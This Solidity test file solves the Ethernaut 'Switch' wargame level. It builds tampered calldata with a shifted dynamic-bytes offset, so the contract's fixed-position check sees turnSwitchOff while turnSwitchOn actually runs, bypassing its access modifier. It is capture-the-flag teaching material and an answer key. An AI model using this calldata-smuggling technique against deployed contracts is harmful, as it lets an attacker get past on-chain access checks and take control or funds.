// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {Switch, SwitchFactory} from "ethernaut/levels/SwitchFactory.sol";

contract SwitchLevel is SetUpLevelTest {
    Switch internal s;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        instanceBalance = 0 ether;
        playerBalance = 0 ether;
        level = address(new SwitchFactory());
        super.setUp();
        s = Switch(instance);

        /** CODE YOUR SOLUTION HERE */

        /**
         * Original data:
         *   0x30c13ade                                                       // function selector
         *   0000000000000000000000000000000000000000000000000000000000000020 // offset (0x20 = 32 bytes)
         *   0000000000000000000000000000000000000000000000000000000000000004 // length
         *   20606e1500000000000000000000000000000000000000000000000000000000 // data
         *
         * Tampered data:
         *   0x30c13ade                                                       // function selector
         *   0000000000000000000000000000000000000000000000000000000000000060 // offset (0x60 = 96 bytes)
         *   0000000000000000000000000000000000000000000000000000000000000004 // false length
         *   20606e1500000000000000000000000000000000000000000000000000000000 // false data
         *   0000000000000000000000000000000000000000000000000000000000000004 // true length
         *   76227e1200000000000000000000000000000000000000000000000000000000 // true data
         */
        vm.startPrank(player);
        bytes memory data = abi.encodePacked(
            Switch.flipSwitch.selector,
            bytes32(uint256(96)),
            bytes32(uint256(4)),
            bytes32(Switch.turnSwitchOff.selector),
            bytes32(uint256(4)),
            bytes32(Switch.turnSwitchOn.selector)
        );
        emit log_named_bytes("data", data);
        (bool success, ) = address(s).call(data);
        assert(success);
        vm.stopPrank();
    }
}
